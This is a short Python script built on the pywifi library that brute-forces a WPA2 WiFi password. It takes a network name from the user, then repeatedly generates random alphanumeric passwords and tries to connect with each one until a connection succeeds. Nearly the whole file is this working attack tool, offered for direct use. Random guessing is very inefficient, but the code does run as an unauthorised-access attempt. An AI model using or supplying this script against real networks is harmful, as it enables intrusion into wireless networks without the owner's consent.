
import pywifi

from pywifi import const

import time

import random

wifi = pywifi.PyWiFi()

iface = wifi.interfaces()[0]

def wifi_connect(ssid, password):

    profile = pywifi.Profile()

    profile.ssid = ssid

    profile.auth = const.AUTH_ALG_OPEN

    profile.akm.append(const.AKM_TYPE_WPA2PSK)

    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password

    iface.remove_all_network_profiles()

    temp_profile = iface.add_network_profile(profile)

    iface.connect(temp_profile)

    time.sleep(5)

    if iface.status() == const.IFACE_CONNECTED:

        return True

    else:

        return False

def generate_password():

    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    password = ''.join(random.choice(characters) for i in range(random.randint(8, 20)))

    return password

if __name__ == '__main__':

    wifi_name = input("Type WiFi Name for bruteforce : ")

    print(f"Starting WiFi password bruteforce for {wifi_name}...")

    

    while True:

        password = generate_password()

        print(f"Trying password: {password}")

        

        if wifi_connect(wifi_name, password):

            print("\033[92m" + f"Password found: {password}" + "\033[0m")

            break



  
